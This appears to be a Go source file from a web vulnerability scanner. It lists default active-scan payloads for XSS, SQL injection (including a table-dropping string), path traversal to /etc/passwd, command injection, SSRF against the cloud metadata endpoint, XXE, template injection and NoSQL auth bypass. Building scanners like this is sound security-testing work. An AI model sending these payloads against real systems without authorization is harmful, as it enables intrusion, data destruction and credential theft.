package active

// Payload represents a test case for active scanning.
type Payload struct {
	Name    string
	Content string
	Type    string // e.g., SQLi, XSS
}

// GetDefaultPayloads returns a comprehensive list of security testing payloads.
func GetDefaultPayloads() []Payload {
	return []Payload{
		// XSS Payloads
		{"Basic XSS", "<script>alert(1)</script>", "XSS"},
		{"XSS IMG", "<img src=x onerror=alert(1)>", "XSS"},
		{"XSS SVG", "<svg onload=alert(1)>", "XSS"},
		{"XSS Event Handler", "<body onload=alert(1)>", "XSS"},
		{"XSS JavaScript Protocol", "javascript:alert(1)", "XSS"},

		// SQL Injection
		{"SQLi Boolean", "' OR 1=1--", "SQLi"},
		{"SQLi Union", "' UNION SELECT 1,2,3--", "SQLi"},
		{"SQLi Time-based", "' AND SLEEP(5)--", "SQLi"},
		{"SQLi Error-based", "' AND 1=CONVERT(int,@@version)--", "SQLi"},
		{"SQLi Stacked", "'; DROP TABLE users--", "SQLi"},

		// Path Traversal / LFI
		{"LFI Unix", "../../../../etc/passwd", "LFI"},
		{"LFI Windows", "..\\..\\..\\..\\windows\\win.ini", "LFI"},
		{"LFI Encoded", "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "LFI"},
		{"LFI Null Byte", "../../../../etc/passwd%00", "LFI"},

		// Command Injection
		{"CMDi Basic", "; ls -la", "CMDi"},
		{"CMDi Pipe", "| whoami", "CMDi"},
		{"CMDi Backtick", "`whoami`", "CMDi"},
		{"CMDi Substitution", "$(whoami)", "CMDi"},

		// SSRF
		{"SSRF Localhost", "http://localhost", "SSRF"},
		{"SSRF Metadata", "http://169.254.169.254/latest/meta-data/", "SSRF"},
		{"SSRF Internal", "http://127.0.0.1", "SSRF"},

		// XXE
		{"XXE Basic", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>", "XXE"},

		// Template Injection
		{"SSTI Jinja2", "{{7*7}}", "SSTI"},
		{"SSTI Twig", "{{7*'7'}}", "SSTI"},

		// NoSQL Injection
		{"NoSQL Auth Bypass", "{\"$ne\": null}", "NoSQLi"},
		{"NoSQL Or", "{\"$or\": [1,1]}", "NoSQLi"},
	}
}
